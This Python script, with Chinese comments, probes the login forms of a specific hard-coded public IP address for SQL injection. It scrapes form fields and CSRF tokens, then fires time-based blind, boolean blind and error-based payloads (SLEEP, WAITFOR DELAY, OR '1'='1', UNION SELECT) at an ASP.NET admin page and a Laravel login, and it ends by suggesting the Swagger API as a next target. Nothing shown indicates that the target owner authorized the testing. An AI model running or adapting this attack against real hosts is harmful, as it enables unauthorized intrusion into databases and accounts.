#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
更精确的 SQL 注入测试
"""

import requests
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "222.255.250.228"

print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    SQL 注入精确测试: {TARGET}                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

# 1. 先分析登录表单
print("\n[1] 分析登录表单结构")

# HTTP (80) - ASP.NET
print("\n[*] HTTP (80) - ASP.NET 登录")
resp = requests.get(f"http://{TARGET}/admin", verify=False)
print(f"状态码: {resp.status_code}")

# 提取表单信息
import re
form_action = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
if form_action:
    print(f"表单 Action: {form_action.group(1)}")

# 查找所有输入字段
inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', resp.text, re.IGNORECASE)
print(f"表单字段: {inputs}")

# 查找隐藏字段（如 ViewState）
hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
if hidden_inputs:
    print("隐藏字段:")
    for name, value in hidden_inputs[:3]:
        print(f"  {name}: {value[:50]}...")

# HTTPS (443) - Laravel
print("\n\n[*] HTTPS (443) - Laravel 登录")
session = requests.Session()
resp = session.get(f"https://{TARGET}/login", verify=False)
print(f"状态码: {resp.status_code}")

# 提取 CSRF token
csrf_token = None
token_match = re.search(r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', resp.text)
if token_match:
    csrf_token = token_match.group(1)
    print(f"CSRF Token: {csrf_token[:30]}...")

# 提取表单字段
form_fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
print(f"表单字段: {form_fields}")

# 2. 测试具体的注入点
print("\n\n[2] SQL 注入测试 - 时间盲注")

# 测试时间盲注
time_payloads = [
    "admin' AND SLEEP(5)--",
    "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "admin' WAITFOR DELAY '0:0:5'--",  # MSSQL
    "admin'; WAITFOR DELAY '00:00:05'--",  # MSSQL
    "admin' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5)--"  # 基于计算的延迟
]

# 测试 ASP.NET 登录
print("\n[*] 测试 ASP.NET (端口 80)")
login_url = f"http://{TARGET}/admin"

for payload in time_payloads[:2]:
    try:
        import time
        data = {
            'txtUserName': payload,
            'txtPass': 'test123'
        }
        
        start_time = time.time()
        resp = requests.post(login_url, data=data, timeout=10)
        elapsed = time.time() - start_time
        
        print(f"Payload: {payload[:30]}...")
        print(f"  响应时间: {elapsed:.2f}秒")
        
        if elapsed > 4:  # 如果延迟超过4秒
            print(f"  [!] 可能存在时间盲注!")
            
    except requests.exceptions.Timeout:
        print(f"  [!] 超时 - 可能存在时间盲注!")
    except Exception as e:
        print(f"  错误: {str(e)[:50]}")

# 3. 布尔盲注测试
print("\n\n[3] SQL 注入测试 - 布尔盲注")

boolean_payloads = [
    ("admin' AND '1'='1", "admin' AND '1'='2"),  # 真/假对比
    ("admin' OR '1'='1", "admin' OR '1'='2"),
    ("admin' AND 1=1--", "admin' AND 1=2--")
]

for true_payload, false_payload in boolean_payloads[:1]:
    try:
        # 真条件
        data_true = {'txtUserName': true_payload, 'txtPass': 'test'}
        resp_true = requests.post(login_url, data=data_true)
        
        # 假条件
        data_false = {'txtUserName': false_payload, 'txtPass': 'test'}
        resp_false = requests.post(login_url, data=data_false)
        
        print(f"\n测试: {true_payload[:30]}...")
        print(f"  真条件响应长度: {len(resp_true.text)}")
        print(f"  假条件响应长度: {len(resp_false.text)}")
        
        # 比较响应差异
        if abs(len(resp_true.text) - len(resp_false.text)) > 50:
            print(f"  [!] 响应长度差异明显，可能存在布尔盲注!")
            
        # 检查特定错误信息
        if 'incorrect' in resp_true.text.lower() and 'incorrect' not in resp_false.text.lower():
            print(f"  [!] 错误信息不同，可能存在注入!")
            
    except Exception as e:
        print(f"  错误: {str(e)}")

# 4. 错误信息分析
print("\n\n[4] 错误信息详细分析")

error_payloads = [
    "'",
    "''",
    "'\"",
    "\\",
    "1/0",
    "' UNION SELECT NULL--",
    "' HAVING 1=1--"
]

for payload in error_payloads:
    try:
        data = {'txtUserName': payload, 'txtPass': 'test'}
        resp = requests.post(login_url, data=data)
        
        # 详细的错误检测
        sql_errors = [
            'microsoft ole db', 'odbc', 'sql server',
            'syntax error', 'unterminated', 'unclosed quotation',
            'quoted string not properly terminated',
            'mysql_fetch', 'pg_exec', 'ora-'
        ]
        
        found_error = False
        for error in sql_errors:
            if error in resp.text.lower():
                print(f"\nPayload: {payload}")
                print(f"  [!] SQL 错误信息: {error}")
                found_error = True
                
                # 提取具体错误内容
                lines = resp.text.split('\n')
                for line in lines:
                    if error in line.lower():
                        print(f"  错误详情: {line.strip()[:100]}...")
                        break
                break
                
    except Exception as e:
        pass

# 5. Laravel 特定测试
print("\n\n[5] Laravel 应用测试")

if csrf_token:
    laravel_url = f"https://{TARGET}/login"
    
    # Laravel 注入测试
    laravel_payloads = [
        {"email": "admin@test.com' OR 1=1--", "password": "test"},
        {"email": "admin@test.com", "password": "' OR '1'='1"},
        {"email": "admin') OR ('1'='1", "password": "test"}
    ]
    
    for payload in laravel_payloads[:1]:
        try:
            data = payload.copy()
            data['_token'] = csrf_token
            
            resp = session.post(laravel_url, data=data, verify=False)
            
            print(f"\nLaravel 测试: email={payload['email'][:30]}...")
            print(f"  状态码: {resp.status_code}")
            
            # 检查 Laravel 错误
            if 'QueryException' in resp.text or 'SQLSTATE' in resp.text:
                print(f"  [!] Laravel SQL 错误!")
                
            # 检查验证错误
            if 'validation' in resp.text.lower() or 'invalid' in resp.text.lower():
                print(f"  [*] 输入验证阻止了注入")
                
        except Exception as e:
            print(f"  错误: {str(e)}")

print("\n\n[+] 测试完成！")
print("\n分析结果：")
print("1. ASP.NET 应用 (端口 80) 可能存在传统的表单处理")
print("2. Laravel 应用 (端口 443) 有 CSRF 保护和输入验证")
print("3. 需要进一步测试其他注入点（如搜索、API 参数等）")
print("4. 建议检查 /swagger API 文档中的接口")